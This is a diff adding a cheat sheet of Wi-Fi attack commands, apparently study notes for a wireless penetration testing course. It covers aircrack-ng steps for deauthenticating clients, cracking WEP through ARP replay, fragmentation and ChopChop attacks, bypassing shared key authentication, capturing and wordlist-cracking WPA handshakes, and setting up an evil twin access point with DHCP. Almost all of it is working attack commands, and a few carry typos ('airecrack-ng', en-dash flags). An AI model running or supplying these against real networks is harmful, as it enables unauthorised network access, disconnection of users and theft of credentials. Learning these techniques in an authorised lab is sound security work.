@@ -1,0 +1,273 @@
+Setup/Test
+# Scan for APs
+iw dev wlan0 scan|grep SSID
+iwlist wlan0 frequency 
+iwlist mon0 channel
+iw dev wlan0 scan|egrep “DS\ Parameter\ set|SSID”
+iw dev wlan0 interface add mon0 type monitor
+ifconfig mon0 up
+
+# tcpdump wireless w/ SNAP length of 65000. Can be used to verify monitor mode
+tcpdump -I mon0 -s 65000 -p
+
+# remove monitor interface
+iw dev mon0 interface del
+
+/*     Consider opening multiple windows/sessions for testing    */
+
+Setup Variables
+
+echo AP=<BSSID> > info
+echo VIC=<Victim client> >> info
+echo MON=<attacker MAC> >>info
+
+for var in $(cat info); do echo export $var >> .bashrc; done
+
+Speed up packet capture
+# Injection test. Wlan0 is the monitor card. Wlan1 is the 2nd wireless adapter.
+airmon-ng start wlan0 <channel>
+aireplay-ng -9 -I wlan1 mon0
+
+
+ 
+Standard WEP Attack
+3 Windows/Sessions
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename> mon0
+
+# Conduct fake authentication. Runs on different window/session while airodump is running. Only works # on “Open Systems” and if it doesn’t work MAC address filtering may be in use. May need to do re-auth # after each attack if using Madwifi driver.
+aireplay-ng -1 60 -e <AP ESSID> -a <AP MAC> -h $MON mon0
+
+# Launch ARP replay attack. Most effective.
+aireplay-ng -3 -b <AP MAC> -h $MON mon0
+
+# Perform deauth attack targeting connected client
+aireplay-ng -0 -1 -a <AP MAC> -c <Client MAC> mon0
+
+# Crack WEP packet
+airecrack-ng -0 <filename>
+
+ 
+Attack Connected Client
+3 Sessions/Windows
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename> mon0
+
+# Conduct fake authentication. Runs on different window/session while airodump is running. Only works # on “Open Systems” and if it doesn’t work MAC address filtering may be in use. May need to do re-auth # after each attack if using Madwifi driver. (Not needed for client attack but can make more reliable)
+aireplay-ng -1 60 -e <AP ESSID> -a <AP MAC> -h $MON mon0
+
+# Interactive Packet Replay Attack. (ARP Request packets are good for this). -d is set to Broadcast              # Destination addr, -m and -n are to target specifically ARP packets. Any interactive packet that is            # injected will create a cap file for that packet.
+	aireplay-ng -2 -b $AP -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
+	Or
+	aireplay-ng -2 -r <replay packet file> mon0
+
+# Aircrack Cap file
+	aircrack-ng -0 -z -n 64 <clientCapFile.cap>
+
+ 
+Clientless WEP Cracking (Fragmentation attack)
+4 Windows/Sessions
+/* Need 1500 bytes of PRGA material. Need a good quality connection and/or close to AP */
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename (WEPfrag)> mon0
+
+# Conduct fake authentication. Runs on different window/session while airodump is running. Only works # on “Open Systems” and if it doesn’t work MAC address filtering may be in use. May need to do re-auth # after each attack if using Madwifi driver. (Not needed for client attack but can make more reliable)
+aireplay-ng -1 60 -e <AP ESSID(WiFu)> -b $AP -h $MON mon0
+
+# Fragmentation attack. Generates XOR file. 
+	aireplay-ng -5 -b $AP -h $MON mon0
+
+# Create encrypted packet. Should use broadcast dest addr (e.g. 192.168.1.255). Broadcast addr cannot exist on network.
+packetforge-ng -0 -a $AP -h $MON -l <src IP addr> -k <dest IP addr> -y <XOR filename> -w <output filename (injectme.cap)>
+
+# Review output file created.
+	tcpdump -n -vvv -e -s0 -r <filename (injectme.cap)>
+
+# Inject packet. Should create weak IVs
+	aireplay-ng -2 -r injectme.cap mon0
+
+# Crack file
+	aircrack-ng -0 wepfrag-01.cap
+ 
+KoreK ChopChop Attack
+4 Windows/Sessions
+
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename (WEPfrag)> mon0
+
+# ChopChop attack. Attempts to decrypt packet and outputs into XOR and CAP format.
+	aireplay-ng -4 -b $AP -h $MON mon0
+
+# Create an encrypted packet to inject.
+# Create encrypted packet. Should use broadcast dest addr (e.g. 192.168.1.255). Broadcast addr cannot exist on network.
+Packetforge-ng -0 -a $AP -h $MON -l <src IP addr> -k <dest IP addr> -y <XOR filename> -w <output filename (injectme.cap)>
+
+# Inject packet. Should create weak Ivs
+	aireplay-ng -2 -r injectme.cap mon0
+
+# Crack file
+	aircrack-ng -0 wepfrag-01.cap
+
+
+ 
+Bypass Shared Key Authentication
+4 Windows/Sessions
+
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename (SharedKey)> mon0
+
+# Conduct fake authentication. Runs on different window/session while airodump is running. Only works # on “Open Systems” and if it doesn’t work MAC address filtering may be in use. May need to do re-auth # after each attack if using Madwifi driver. (Not needed for client attack but can make more reliable)
+aireplay-ng -1 60 -e <AP ESSID(WiFu)> -b $AP -h $MON mon0
+
+*** Will get notification “Switching to shared key authentication” and airodump will show “Broken SKA” ***
+# Send Deauth. Should receive “XXX bytes keystream: <$AP MAC>”. Will   # generate PRGA XOR file (SharedKey.xor).
+	aireplay-ng -0 1 -a $AP -c $VIC mon0
+
+
+# FakeAuth replay attack. Will re-auth every 60 seconds
+aireplay-ng -1 60 -e <AP ESSID(WiFu)> -y <SharedKey.xor> -a $AP  -h $MON mon0
+
+# Should show successful authentication.
+	aireplay-ng -3 -b $AP -h $MON mon0
+
+# Deauth to speed up attack.
+	aireplay-ng -0 1 -a $AP -c $VIC mon0
+
+
+# Crack file
+	aircrack-ng -0 -z -n 64 SharedKey.cap
+
+
+
+
+ 
+Crack WPA
+
+3 Windows/Sessions
+
+# Enter monitor mode
+airmon-ng check kill
+airmon-ng start wlan0 <AP Channel>
+or
+iwconfig wlan0 mode monitor channel <#>
+ifconfig wlan0 up
+
+# Start capture dump. Filename will be cap file to be cracked later.
+airodump-ng -c <AP Channel> --bssid $AP -w <Filename (WPA)> mon0
+
+
+# Cap 4-way handshake. Packets 1 & 3 need to have the same NONCE value
+	aireplay-ng -0 1 -a $AP -c $VIC mon0
+
+# Crack file
+	aircrack-ng -0 -w /pentest/passwords/john/password.lst <WPA.cap>
+
+
+OR
+
+
+# airolib-ng to crack WPA/2 passwords
+	echo <ESSID name> > essid.txt
+
+
+# Import into database
+	airolib-ng testdb –import essid essid.txt
+	airolib-ng testdb --stats
+		airolib-ng testdb –import passwd /pentest/passwords/john/password.lst
+	airolib-ng testdb –batch
+airolib-ng testdb --stats
+
+# Crack file
+	aircrack-ng -r testdb WPA.cap
+
+
+
+
+
+
+
+
+ 
+Password Cracking
+
+# Basic password crack
+	aircrack-ng -0 -w /pentest/passwords/john/password.lst WPA.cap
+
+# Use JtR word mangling with aircrack
+nano /pentest/passwords/john/john.conf
+{List.Rules:Wordlist}
+# insert at bottom of section
+$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]
+./john –wordlist=/pentest/wireless/aircrack-ng/test/password.lst --rules --stdout | aircrack-ng -0 -e <ESSID> -w - /root/wpa.cap
+
+
+# Use coWPAtty. “-2” is needed when using against airodump captures. This # command is kinda slow
+cowpatty -r wpa.cap -f /pentest/passwords/john/password.lst -2 -s <ESSID>
+
+# Decrypt an encrypted .cap file
+	airdecap-ng -w <WEP key> wep.cap
+	airdecap-ng -e <ESSID> -p <WPA password> WPA.cap
+
+
+
+
+
+
+ 
+Evil Twin
+
+
+# Basic Evil Twin.
+	airodump-ng -c <channel> -d $MON -w airbase mon0
+airbase-ng -c <channel> -e <ESSID name> mon0
+ifconfig at0 up
+
+# Evil Twin with WPA support to capture handshakes.
+	airodump-ng -c <channel> -d $MON -w airbase mon0
+airbase-ng -c <channel> -e <ESSID> -z 4 -W 1 mon0
+ifconfig at0 up
+
+
+# To add DHCP support in 1 line.
+	dnsmasq --dhcp-range=192.168.13.10,192.168.13.254,24h -i at0
+
+# Monitor leases issued.
+dhcpdump -i at0
+
+
